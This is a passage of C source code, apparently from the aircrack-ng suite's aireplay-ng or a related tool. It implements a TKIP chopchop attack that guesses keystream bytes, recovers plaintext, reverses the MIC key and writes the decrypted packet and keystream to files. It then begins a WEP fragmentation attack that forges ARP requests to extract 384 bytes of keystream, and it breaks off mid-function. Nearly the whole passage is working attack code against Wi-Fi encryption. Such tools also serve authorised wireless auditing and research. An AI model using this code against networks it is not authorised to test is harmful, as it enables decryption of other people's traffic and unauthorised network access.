            memcpy( smac, srcbuf + 24, 6 );
            break;
    }

    if( ( chopped = (unsigned char *) malloc( n ) ) == NULL )
    {
        perror( "malloc failed" );
        return( 1 );
    }

    memset( chopped, 0, n );

    memcpy( chopped, h80211, n);

    data_start = 26 + 8;
    srclen = data_end = n;
    srcdiff = z-24;

//     chopped[0] = 0x88;  /* QoS data frame */
//     chopped[1] = 0x41;  /* WEP = 1, ToDS = 1 */

    chopped[24] ^= 0x01;
    chopped[25] = 0x00;

//     for(i=0; i<4; i++)
//     {
//         chopped[24] = 0x01;
//         if( send_packet( chopped, n ) != 0 )
//                 return( 1 );
//         usleep(10000);
//     }

    /* copy the duration */

//     memcpy( chopped + 2, h80211 + 2, 2 );

    /* copy the BSSID */

//     switch( h80211[1] & 3 )
//     {
//         case  0: memcpy( chopped + 4, h80211 + 16, 6 ); break;
//         case  1: memcpy( chopped + 4, h80211 +  4, 6 ); break;
//         case  2: memcpy( chopped + 4, h80211 + 10, 6 ); break;
//         default: memcpy( chopped + 4, h80211 + 10, 6 ); break;
//     }

    /* copy the WEP IV */

//     memcpy( chopped + 24, h80211 + z, 4 );

    /* setup the xor mask to hide the original data */

    crc_mask = 0;

    for( i = data_start; i < data_end - 4; i++ )
    {
        switch( i - data_start )
        {
            case  0: chopped[i] = b1 ^ 0xE0; break;
            case  1: chopped[i] = b2 ^ 0xE0; break;
            case  2: chopped[i] = 0x03 ^ 0x03; break;
            default: chopped[i] = 0x55 ^ ( i & 0xFF ); break;
        }

        crc_mask = crc_tbl[crc_mask & 0xFF]
                 ^ ( crc_mask   >>  8 )
                 ^ ( chopped[i] << 24 );
    }

    for( i = 0; i < 4; i++ )
        crc_mask = crc_tbl[crc_mask & 0xFF]
                 ^ ( crc_mask >> 8 );

    chopped[data_end - 4] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 3] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 2] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 1] = crc_mask; crc_mask >>= 8;

    for( i = data_start; i < data_end; i++ )
        chopped[i] ^= srcbuf[i];
//         chopped[i] ^= srcbuf[i+srcdiff];

    data_start += 6; /* skip the SNAP header */

    is_deauth_mode = 0;

//     opt.r_dmac[0] = 0xFF;
//     opt.r_dmac[1] = rand() & 0xFE;
//     opt.r_dmac[2] = rand() & 0xFF;
//     opt.r_dmac[3] = rand() & 0xFF;
//     opt.r_dmac[4] = rand() & 0xFF;

    /* chop down old/known keystreambytes */
    for(i=0; i<opt.oldkeystreamlen; i++)
    {
        guess = (opt.oldkeystream[i] ^ chopped[data_end - 1]) % 256;

        n = caplen - data_start;

        chopped[data_end - 1] ^= guess;
        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

        printf( "\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X\n", data_end - 1,
                100 * ( caplen - data_end ) / n,
                chopped[data_end - 1],
                chopped[data_end - 1] ^ srcbuf[data_end - 1]);

        data_end--;
    }

    /* let's go chopping */

    memset( ticks, 0, sizeof( ticks ) );

    nb_pkt_read = 0;
    nb_pkt_sent = 0;
    nb_bad_pkt  = 0;
    guess       = 256;

    tt = time( NULL );

//     alarm( 30 );
//
//     signal( SIGALRM, sighandler );

    if(opt.port_in <= 0)
    {
        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            return( 1 );
        }
    }

    while( data_end > data_start )
    {
        if( alarmed )
        {
            printf( "\n\n"
"The chopchop attack appears to have failed. Possible reasons:\n"
"\n"
"    * You're trying to inject with an unsupported chipset (Centrino?).\n"
"    * The driver source wasn't properly patched for injection support.\n"
"    * You are too far from the AP. Get closer or reduce the send rate.\n"
"    * Target is 802.11g only but you are using a Prism2 or RTL8180.\n"
"    * The wireless interface isn't setup on the correct channel.\n" );
            if( is_deauth_mode )
                printf(
"    * The AP isn't vulnerable when operating in non-authenticated mode.\n"
"      Run aireplay-ng in authenticated mode instead (-h option).\n\n" );
            else
                printf(
"    * The client MAC you have specified is not currently authenticated.\n"
"      Try running another aireplay-ng to fake authentication (attack \"-1\").\n"
"    * The AP isn't vulnerable when operating in authenticated mode.\n"
"      Try aireplay-ng in non-authenticated mode instead (no -h option).\n\n" );
            return( 1 );
        }

        /* wait for the next timer interrupt, or sleep */

        if( (nb_pkt_sent > 0) && (nb_pkt_sent % 256 == 0) && settle == 0)
        {
            printf( "\rLooks like mic failure report was not detected."
                    "Waiting %i seconds before trying again to avoid "
                    "the AP shutting down.\n", opt.mic_failure_interval);
            fflush( stdout );
            settle = 1;
            sleep(opt.mic_failure_interval);
        }

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "\nread(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;  /* ticks since we entered the while loop     */
            ticks[1]++;  /* ticks since the last status line update   */
            ticks[2]++;  /* ticks since the last frame was sent       */
            ticks[3]++;  /* ticks since started chopping current byte */
        }
        else
        {
            /* we can't trust usleep, since it depends on the HZ */

            gettimeofday( &tv,  NULL );
            usleep( 976 );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / 976;
            ticks[1] += f / 976;
            ticks[2] += f / 976;
            ticks[3] += f / 976;
        }

        /* update the status line */

        if( ticks[1] > (RTC_RESOLUTION/10) )
        {
            ticks[1] = 0;
            printf( "\rSent %3lu packets, current guess: %02X...\33[K",
                    nb_pkt_sent, guess );
            fflush( stdout );
        }

/*        if( data_end < 47 && ticks[3] > 8 * ( ticks[0] - ticks[3] ) /
                                (int) ( caplen - ( data_end - 1 ) ) )*/
        if( data_end < 47 && tries > 512)
        {
            header_rec:

            printf( "\n\nThe AP appears to drop packets shorter "
                    "than %d bytes.\n",data_end );

            data_end = 46;

            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                z+=2;

            diff = z-24;

            if( ( chopped[data_end + 0] ^ srcbuf[data_end + 0] ) == 0x06 &&
                ( chopped[data_end + 1] ^ srcbuf[data_end + 1] ) == 0x04 &&
                ( chopped[data_end + 2] ^ srcbuf[data_end + 2] ) == 0x00 )
            {
                printf( "Enabling standard workaround: "
                        "ARP header re-creation.\n" );

                chopped[26 + 8 + 6] = srcbuf[26 + 8 + 6] ^ 0x08;
                chopped[26 + 8 + 7] = srcbuf[26 + 8 + 7] ^ 0x06;
                chopped[26 + 8 + 8] = srcbuf[26 + 8 + 8] ^ 0x00;
                chopped[26 + 8 + 9] = srcbuf[26 + 8 + 9] ^ 0x01;
                chopped[26 + 8 + 10] = srcbuf[26 + 8 + 10] ^ 0x08;
                chopped[26 + 8 + 11] = srcbuf[26 + 8 + 11] ^ 0x00;
            }
            else
            {
                printf( "Enabling standard workaround: "
                        " IP header re-creation.\n" );

                n = caplen - ( z + 16 );

                chopped[26 + 8 +  0] = srcbuf[26 + 8 + 0] ^ 0xAA;
                chopped[26 + 8 +  1] = srcbuf[26 + 8 + 1] ^ 0xAA;
                chopped[26 + 8 +  2] = srcbuf[26 + 8 + 2] ^ 0x03;
                chopped[26 + 8 +  3] = srcbuf[26 + 8 + 3] ^ 0x00;
                chopped[26 + 8 +  4] = srcbuf[26 + 8 + 4] ^ 0x00;
                chopped[26 + 8 +  5] = srcbuf[26 + 8 + 5] ^ 0x00;
                chopped[26 + 8 +  6] = srcbuf[26 + 8 + 6] ^ 0x08;
                chopped[26 + 8 +  7] = srcbuf[26 + 8 + 7] ^ 0x00;
                chopped[26 + 8 +  8] = srcbuf[26 + 8 + 8] ^ ( n >> 8 );
                chopped[26 + 8 +  9] = srcbuf[26 + 8 + 9] ^ ( n & 0xFF );

                memcpy( h80211, srcbuf, caplen );

                for( i = 26 + 8; i < (int) caplen; i++ )
                    h80211[i - 8] = h80211[i] ^ chopped[i];

                /* sometimes the header length or the tos field vary */

                for( i = 0; i < 16; i++ )
                {
                    h80211[26 +  8] = 0x40 + i;
                    chopped[26 + 8 + 8] = srcbuf[26 + 8 + 8] ^ ( 0x40 + i );

                    for( j = 0; j < 256; j++ )
                    {
                        h80211[26 +  9] = j;
                        chopped[26 + 13] = srcbuf[26 + 8 + 9] ^ j;

                        if( check_crc_buf( h80211 + 26, caplen - 26 - 8 - 4 ) )
                            goto have_crc_match;
                    }
                }

                printf( "This doesn't look like an IP packet, "
                        "try another one.\n" );
            }

        have_crc_match:
            break;
        }

        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )
        {
            /* send one modified frame */

            ticks[2] = 0;

            memcpy( h80211, chopped, data_end - 1 );

            /* note: guess 256 is special, it tests if the  *
             * AP properly drops frames with an invalid ICV *
             * so this guess always has its bit 8 set to 0  */

            if( is_deauth_mode )
            {
                opt.r_smac[1] |= ( guess < 256 );
                opt.r_smac[5]  = guess & 0xFF;
            }
            else
            {
                opt.r_dmac[1] |= ( guess < 256 );
                opt.r_dmac[5]  = guess & 0xFF;
            }

//             memcpy( h80211 + 10, opt.r_smac,  6 );
//             memcpy( h80211 + 16, opt.r_dmac,  6 );

            if( guess < 256 )
            {
                h80211[data_end - 2] ^= crc_chop_tbl[guess][3];
                h80211[data_end - 3] ^= crc_chop_tbl[guess][2];
                h80211[data_end - 4] ^= crc_chop_tbl[guess][1];
                h80211[data_end - 5] ^= crc_chop_tbl[guess][0];
            }

            errno = 0;

            if( send_packet( h80211, data_end -1 ) != 0 )
            {
                free(chopped);
                return( 1 );
            }

            if( errno != EAGAIN )
            {
                guess++;

                if( guess > 256 )
                    guess = 0;
                else
                    tries++;

                settle=0;
            }

            if(tries > 768 && data_end < srclen)
            {
                //go back one step and validate the last chopped byte
                tries = 0;

                data_end++;

                guess = chopped[data_end - 1] ^ srcbuf[data_end - 1];

                chopped[data_end - 1] ^= guess;
                chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
                chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
                chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
                chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

                ticks[3]        = 0;
                nb_pkt_sent     = 0;
                nb_bad_pkt      = 0;
                guess           = 256;

                PCT; printf("\nMoved one step backwards to chop the last byte again.\n");
                continue;
            }
        }

        /* watch for a response from the AP */

        n = read_packet( h80211, sizeof( h80211 ), NULL );

        if( n  < 0 ){
            free(chopped);
            return( 1 );
        }
        if( n == 0 ) continue;

        nb_pkt_read++;

        /* check if it's a deauth packet */

        if( h80211[0] == 0xA0 || h80211[0] == 0xC0 )
        {
            if( memcmp( h80211 + 4, opt.r_smac, 6 ) == 0 )
            {
                nb_bad_pkt++;

                if( nb_bad_pkt > 2 )
                {
                    printf(
                "\n\nFailure: got several deauthentication packets "
                "from the AP - you need to start the whole process "
                "all over again, as the client got disconnected.\n\n" );
                    free(chopped);
                    return( 1 );
                }

                continue;
            }

            if( h80211[4] != opt.r_smac[0] ) continue;
            if( h80211[6] != opt.r_smac[2] ) continue;
            if( h80211[7] != opt.r_smac[3] ) continue;
            if( h80211[8] != opt.r_smac[4] ) continue;

//             if( ( h80211[5]     & 0xFE ) !=
//                 ( opt.r_smac[1] & 0xFE ) ) continue;

/*            if( ! ( h80211[5] & 1 ) )
            {*/
            	if( data_end < 41 ) goto header_rec;

                printf( "\n\nFailure: the access point does not properly "
                        "discard frames with an\ninvalid ICV - try running "
                        "aireplay-ng in authenticated mode (-h) instead.\n\n" );
                free(chopped);
                return( 1 );
//             }
        }
        else
        {
            /* check if it's a WEP data packet */

            if( ( h80211[0] & 0x0C ) != 8 ) continue; //must be a data packet
            if( ( h80211[0] & 0x70 ) != 0 ) continue;
//             if( ( h80211[1] & 0x03 ) != 2 ) continue;
            if( ( h80211[1] & 0x40 ) == 0 ) continue;

            /* get header length right */
            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                z+=2;

            /* check the extended IV (TKIP) flag */
            if( ( h80211[z + 3] & 0x20 ) == 0 ) continue;

            /* check length (153)!? */
            if( z+127 != n ) continue; //(153[26+127] bytes for eapol mic failure in tkip qos frames from client to AP)

//             printf("yeah!\n");

            //direction must be inverted.
            if( ((h80211[1] & 3) ^ (srcbuf[1] & 3)) != 0x03 ) continue;

            //check correct macs
            switch( h80211[1] & 3 )
            {
                case  1:
                    if( memcmp( bssid, h80211 +  4, 6 ) != 0 &&
                        memcmp( dmac , h80211 + 10, 6 ) != 0 &&
                        memcmp( bssid, h80211 + 16, 6 ) != 0) continue;
                    break;
                case  2:
                    if( memcmp( smac , h80211 +  4, 6 ) != 0 &&
                        memcmp( bssid, h80211 + 10, 6 ) != 0 &&
                        memcmp( bssid, h80211 + 16, 6 ) != 0) continue;
                    break;
                default:
                    continue;
                    break;
            }

/*            if( h80211[4] != opt.r_dmac[0] ) continue;
            if( h80211[6] != opt.r_dmac[2] ) continue;
            if( h80211[7] != opt.r_dmac[3] ) continue;
            if( h80211[8] != opt.r_dmac[4] ) continue;

            if( ( h80211[5]     & 0xFE ) !=
                ( opt.r_dmac[1] & 0xFE ) ) continue;

            if( ! ( h80211[5] & 1 ) )
            {
            	if( data_end < 41 ) goto header_rec;

                printf( "\n\nFailure: the access point does not properly "
                        "discard frames with an\ninvalid ICV - try running "
                        "aireplay-ng in non-authenticated mode instead.\n\n" );
                return( 1 );
            }*/
            if(nb_pkt_sent < 1)
                continue;
        }

        /* we have a winner */

//         guess = h80211[9];
        tries = 0;
        settle = 0;
        guess = (guess - 1) % 256;

        chopped[data_end - 1] ^= guess;
        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

        n = caplen - data_start;

        printf( "\r"); PCT; printf("Offset %4d (%2d%% done) | xor = %02X | pt = %02X | "
                "%4lu frames written in %5.0fms\n", data_end - 1,
                100 * ( caplen - data_end ) / n,
                chopped[data_end - 1],
                chopped[data_end - 1] ^ srcbuf[data_end - 1],
                nb_pkt_sent, ticks[3] );

        if( is_deauth_mode )
        {
            opt.r_smac[1] = rand() & 0x3E;
            opt.r_smac[2] = rand() & 0xFF;
            opt.r_smac[3] = rand() & 0xFF;
            opt.r_smac[4] = rand() & 0xFF;
        }
        else
        {
            opt.r_dmac[1] = rand() & 0xFE;
            opt.r_dmac[2] = rand() & 0xFF;
            opt.r_dmac[3] = rand() & 0xFF;
            opt.r_dmac[4] = rand() & 0xFF;
        }

        ticks[3]        = 0;
        nb_pkt_sent     = 0;
        nb_bad_pkt      = 0;
        guess           = 256;

        data_end--;

        gettimeofday(&opt.last_mic_failure, NULL);
        PCT; printf("\rSleeping for %i seconds.", opt.mic_failure_interval);
        fflush(stdout);

        if( guess_packet(srcbuf, chopped, caplen, caplen-data_end) == 0) //found correct packet :)
            break;

        while(1)
        {
            gettimeofday(&mic_fail, NULL);
            if( (mic_fail.tv_sec - opt.last_mic_failure.tv_sec) * 1000000 + (mic_fail.tv_usec - opt.last_mic_failure.tv_usec) > opt.mic_failure_interval * 1000000)
                break;
            sleep(1);
        }

        alarm( 0 );
    }

    /* reveal the plaintext (chopped contains the prga) */

    memcpy( h80211, srcbuf, caplen );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;
    diff = z-24;

    chopped[26 + 8 + 0] = srcbuf[26 + 8 + 0] ^ b1;
    chopped[26 + 8 + 1] = srcbuf[26 + 8 + 1] ^ b2;
    chopped[26 + 8 + 2] = srcbuf[26 + 8 + 2] ^ 0x03;
    chopped[26 + 8 + 3] = srcbuf[26 + 8 + 3] ^ 0x00;
    chopped[26 + 8 + 4] = srcbuf[26 + 8 + 4] ^ 0x00;
    chopped[26 + 8 + 5] = srcbuf[26 + 8 + 5] ^ 0x00;

    for( i = 26 + 8; i < (int) caplen; i++ )
        h80211[i - 8] = h80211[i] ^ chopped[i];

    if( ! check_crc_buf( h80211 + 26, caplen - 26 - 8 - 4 ) ) {
        if (!tried_header_rec) {
            printf( "\nWarning: ICV checksum verification FAILED! Trying workaround.\n" );
            tried_header_rec=1;
            goto header_rec;
        } else {
            printf( "\nWorkaround couldn't fix ICV checksum.\nPacket is most likely invalid/useless\nTry another one.\n" );
        }
    }

    caplen -= 8 + 4; /* remove the TKIP EXT IV & CRC (ICV) */

    if(opt.got_ptk)
    {
        PCT; printf("Priority: %02X:%02X\n", h80211[z-2], h80211[z-1]);
        calc_tkip_mic(h80211, caplen-8, opt.wpa_sta.ptk, mic);
        if( memcmp(mic, h80211+caplen-8, 8) == 0)
        {
            PCT; printf("Correct MIC!\n");
        }
        else
        {
            PCT; printf("Incorrect MIC!\n");
        }
        PCT; printf("Captured MIC: ");
        for(i=0; i<7; i++)
            printf("%02X:", h80211[caplen-8+i]);
        printf("%02X\n", h80211[caplen-1]);
        PCT; printf("Calculated MIC: ");
        for(i=0; i<7; i++)
            printf("%02X:", mic[i]);
        printf("%02X\n", mic[7]);
    }

    calc_tkip_mic_key(h80211, caplen, mic);

    h80211[1] &= 0xBF;   /* remove the WEP bit, too */

    if((h80211[1] & 3) == 1)
    {
        PCT; printf("Reversed MIC Key (ToDS): ");
        for(i=0; i<7; i++)
            printf("%02X:", mic[i]);
        printf("%02X\n", mic[7]);
        memcpy(opt.ptk+48+8, mic, 8);
        opt.got_mic_tods=1;
        opt.chopped_to_plain = (unsigned char*) malloc( caplen );
        memcpy(opt.chopped_to_plain, h80211, caplen);
        opt.chopped_to_plain_len = caplen;
        opt.chopped_to_prga = (unsigned char*) malloc( caplen - 26 + 4 + 8 );
        memcpy(opt.chopped_to_prga, chopped+26, caplen-26+4+8);
        opt.chopped_to_prga_len = caplen-26+4+8;
    }

    if((h80211[1] & 3) == 2)
    {
        PCT; printf("Reversed MIC Key (FromDS): ");
        for(i=0; i<7; i++)
            printf("%02X:", mic[i]);
        printf("%02X\n", mic[7]);
        memcpy(opt.ptk+48, mic, 8);
        opt.got_mic_fromds=1;
        opt.chopped_from_plain = (unsigned char*) malloc( caplen );
        memcpy(opt.chopped_from_plain, h80211, caplen);
        opt.chopped_from_plain_len = caplen;
        opt.chopped_from_prga = (unsigned char*) malloc( caplen - 26 + 4 + 8 );
        memcpy(opt.chopped_from_prga, chopped+26, caplen-26+4+8);
        opt.chopped_from_prga_len = caplen-26+4+8;
    }

    /* save the decrypted packet */

    gettimeofday( &tv, NULL );

    pfh_out.magic         = TCPDUMP_MAGIC;
    pfh_out.version_major = PCAP_VERSION_MAJOR;
    pfh_out.version_minor = PCAP_VERSION_MINOR;
    pfh_out.thiszone      = 0;
    pfh_out.sigfigs       = 0;
    pfh_out.snaplen       = 65535;
    pfh_out.linktype      = LINKTYPE_IEEE802_11;

    pkh.tv_sec  = tv.tv_sec;
    pkh.tv_usec = tv.tv_usec;
    pkh.caplen  = caplen;
    pkh.len     = caplen;

    lt = localtime( (const time_t *) &tv.tv_sec );

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_dec-%02d%02d-%02d%02d%02d.cap",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "\nSaving plaintext in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed\n" );
        return( 1 );
    }

    n = sizeof( pkh );

    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    n = pkh.caplen;

    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    /* save the RC4 stream (xor mask) */

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_dec-%02d%02d-%02d%02d%02d.xor",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "Saving keystream in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = pkh.caplen + 8 - 26 - 8;

    if( fwrite( chopped + 26 + 8, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    PCT; printf( "\nCompleted in %lds (%0.2f bytes/s)\n\n",
            (long) time( NULL ) - tt,
            (float) ( pkh.caplen - 6 - 26 ) /
            (float) ( time( NULL ) - tt  ) );

    return( 0 );
}

int make_arp_request(unsigned char *h80211, unsigned char *bssid, unsigned char *src_mac, unsigned char *dst_mac, unsigned char *src_ip, unsigned char *dst_ip, int size)
{
	unsigned char *arp_header = (unsigned char*)"\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01";
	unsigned char *header80211 = (unsigned char*)"\x08\x41\x95\x00";

    // 802.11 part
    memcpy(h80211,    header80211, 4);
    memcpy(h80211+4,  bssid,       6);
    memcpy(h80211+10, src_mac,     6);
    memcpy(h80211+16, dst_mac,     6);
    h80211[22] = '\x00';
    h80211[23] = '\x00';

    // ARP part
    memcpy(h80211+24, arp_header, 16);
    memcpy(h80211+40, src_mac,     6);
    memcpy(h80211+46, src_ip,      4);
    memset(h80211+50, '\x00',      6);
    memcpy(h80211+56, dst_ip,      4);

    // Insert padding bytes
    memset(h80211+60, '\x00', size-60);

    return 0;
}

void save_prga(char *filename, unsigned char *iv, unsigned char *prga, int prgalen)
{
	size_t unused;
    FILE *xorfile;
    xorfile = fopen(filename, "wb");
    unused = fwrite (iv, 1, 4, xorfile);
    unused = fwrite (prga, 1, prgalen, xorfile);
    fclose (xorfile);
}

int do_attack_fragment()
{
    unsigned char packet[4096];
    unsigned char packet2[4096];
    unsigned char prga[4096];
    unsigned char iv[4];

//    unsigned char ack[14] = "\xd4";

    char strbuf[256];

    struct tm *lt;
    struct timeval tv, tv2;

    int done;
    int caplen;
    int caplen2;
    int arplen;
    int round;
    int prga_len;
    int isrelay;
    int again;
    int length;
    int ret;
    int gotit;
    int acksgot;
    int packets;
    int z;

    unsigned char *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";

    done = caplen = caplen2 = arplen = round = 0;
    prga_len = isrelay = gotit = again = length = 0;

    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    if(getnet(NULL, 1, 1) != 0)
        return 1;

    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
    {
        memset( opt.r_dmac, '\xFF', 6);
        opt.r_dmac[5] = 0xED;
    }

    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_sip, '\xFF', 4);
    }

    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_dip, '\xFF', 4);
    }

    PCT; printf ("Waiting for a data packet...\n");

    while(!done)  //
    {
        round = 0;

        if( capture_ask_packet( &caplen, 0 ) != 0 )
            return -1;

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
            z+=2;

        if((unsigned)caplen > sizeof(packet) || (unsigned)caplen > sizeof(packet2))
            continue;

        memcpy( packet2, h80211, caplen );
        caplen2 = caplen;
        PCT; printf("Data packet found!\n");

        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||
             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
        {
            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
            packet2[z+6] = ((packet2[z+6] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08
        }

        prga_len = 7;

        again = RETRY;

        memcpy( packet, packet2, caplen2 );
        caplen = caplen2;
        memcpy(prga, packet+z+4, prga_len);
        memcpy(iv, packet+z, 4);

        xor_keystream(prga, snap_header, prga_len);

        while(again == RETRY)  //sending 7byte fragments
        {
            again = 0;

            arplen=60;
            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);

            if ((round % 2) == 1)
            {
                PCT; printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', 39);
                arplen=63;
            }

            acksgot=0;
            packets=(arplen-24)/(prga_len-4);
            if( (arplen-24)%(prga_len-4) != 0 )
                packets++;

            PCT; printf("Sending fragmented packet\n");
            send_fragments(h80211, arplen, iv, prga, prga_len-4, 0);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );


            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, sizeof(packet), NULL);
                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                    z+=2;

                if (packet[0] == 0xD4 )
                {
                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                    {
                        acksgot++;
                    }
                    continue;
                }

                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) )  //Is a FromDS packet
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen-z < 66)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    PCT; printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
                {
                    PCT; printf("Not enough acks, repeating...\n");
                    again = RETRY;
                    break;
                }

                if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                {
                    PCT; printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        PCT; printf("Still nothing, trying another packet...\n");
                        again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
        if (caplen-z == 68-24)
        {
            //Thats the ARP packet!
//             PCT; printf("Thats our ARP packet!\n");
        }
        if (caplen-z == 71-24)
        {
            //Thats the LLC NULL packet!
//             PCT; printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', 39);
        }

        if (! isrelay)
        {
            //Building expected cleartext
            unsigned char ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
            //Ethernet & ARP header

            //Followed by the senders MAC and IP:
            memcpy(ct+16, packet+16, 6);
            memcpy(ct+22, opt.r_dip,  4);

            //And our own MAC and IP:
            memcpy(ct+26, opt.r_smac,   6);
            memcpy(ct+32, opt.r_sip,   4);

            //Calculating
            memcpy(prga, packet+z+4, 36);
            xor_keystream(prga, ct, 36);
        }
        else
        {
            memcpy(prga, packet+z+4, 36);
            xor_keystream(prga, h80211+24, 36);
        }

        memcpy(iv, packet+z, 4);
        round = 0;
        again = RETRY;
        while(again == RETRY)
        {
            again = 0;

            PCT; printf("Trying to get 384 bytes of a keystream\n");

            arplen=408;

            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
            if ((round % 2) == 1)
            {
                PCT; printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', arplen+8);
                arplen+=32;
            }

            acksgot=0;
            packets=(arplen-24)/(32);
            if( (arplen-24)%(32) != 0 )
                packets++;

            send_fragments(h80211, arplen, iv, prga, 32, 0);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );

            gotit=0;
            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, sizeof(packet), NULL);
                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                    z+=2;

                if (packet[0] == 0xD4 )
                {
                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                        acksgot++;
                    continue;
                }

